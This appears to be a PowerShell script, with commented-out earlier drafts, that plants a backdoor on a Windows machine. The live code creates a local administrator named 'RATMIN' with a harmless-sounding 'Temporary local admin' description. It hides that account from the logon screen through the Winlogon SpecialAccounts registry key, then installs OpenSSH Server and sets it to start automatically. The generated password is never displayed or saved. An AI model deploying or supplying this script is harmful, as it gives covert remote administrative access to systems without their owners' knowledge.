# # Generate a random password
# function RandomPasswordGenerator {
#     return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
# }

# $Username = "ICU"
# $Password = RandomPasswordGenerator  # Corrected variable name

# # Remove the local user if it exists
# if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
#     Remove-LocalUser -Name $Username
# }

# function CreateAdministrator {
#     [CmdletBinding()]
#     param (
#         [string] $Username,
#         [securestring] $Password
#     )    
#     begin {
#     }    
#     process {
#         New-LocalUser "$Username" -Password $Password -FullName "$Username" -Description "Temporary local admin"
#         Write-Verbose "$Username local user created"
#         Add-LocalGroupMember -Group "Administrators" -Member "$Username"
#         Write-Verbose "$Username added to the local administrator group"
#     }    
#     end {
#     }
# }

function Generate-StrongPassword {
    # Generate a stronger password with at least one upper case letter, one lower case letter, one digit, and one special character.
    $specialCharacters = '!@#$%^&*()_+-=[]{}|;:,.<>?'
    $upperCaseLetters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    $lowerCaseLetters = 'abcdefghijklmnopqrstuvwxyz'
    $numbers = '0123456789'

    $password = Get-Random -InputObject ($upperCaseLetters + $lowerCaseLetters + $numbers + $specialCharacters) -Count 12
    return -join $password
}

function Create-LocalAdminUser {
    [CmdletBinding()]
    param (
        [string] $Username,
        [securestring] $Password
    )    
    begin {
    }    
    process {
        New-LocalUser -Name $Username -Password $Password -FullName $Username -Description "Temporary local admin"
        Write-Verbose "$Username local user created"
        Add-LocalGroupMember -Group "Administrators" -Member $Username
        Write-Verbose "$Username added to the local administrator group"
    }    
    end {
    }
}

$Username = "RATMIN"
$Password = Generate-StrongPassword
Remove-LocalUser -Name $Username
$SecurePassword = (ConvertTo-SecureString $Password -AsPlainText -Force)
Create-LocalAdminUser -Username $Username -Password $SecurePassword

$RegistryPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$RegistryValue = '00000000'

New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $RegistryPath -Name $Username -Value $RegistryValue -PropertyType DWORD -Force

# # Create a new local user with administrator privileges
# New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText -Force) -FullName $Username -Description "Temporary Local Administrator"

# # Add the new user to the Administrators group
# Add-LocalGroupMember -Group "Administrators" -Member $Username

# # Hide the user from the Windows logon screen
# New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force

# Install the OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the sshd service
Start-Service sshd

# Set the sshd service to start automatically
Set-Service -Name sshd -StartupType "Automatic"
